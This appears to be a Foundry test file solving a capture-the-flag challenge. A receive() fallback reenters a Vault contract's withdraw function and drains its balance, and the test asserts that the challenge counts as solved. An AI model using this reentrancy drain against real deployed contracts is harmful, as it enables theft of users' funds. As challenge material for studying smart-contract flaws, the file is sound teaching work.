// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "@src/HackCtf/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;
    address owner = address(1);
    address palyer = address(2);
    bool reenter = true;

    // Fallback function to receive Ether from the Vault and reenter `withdraw`
    /**
     * 接收资金
     */
    receive() external payable {
        if (reenter) {
            reenter = false;
            vault.withdraw(); // Reenter withdraw recursively
        }
    }

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.openWithdraw();

        vm.stopPrank();
    }

    /**
     * 重入攻击
     */
    function testExploit() public {
        deal(address(this), 1 ether);
        vault.deposite{value: 1 ether}();
        assertEq(address(vault).balance, 1 ether);
        vault.withdraw();
        assertEq(address(vault).balance, 0);
        vm.stopPrank();
        require(vault.isSolve(), "solved");
    }
}
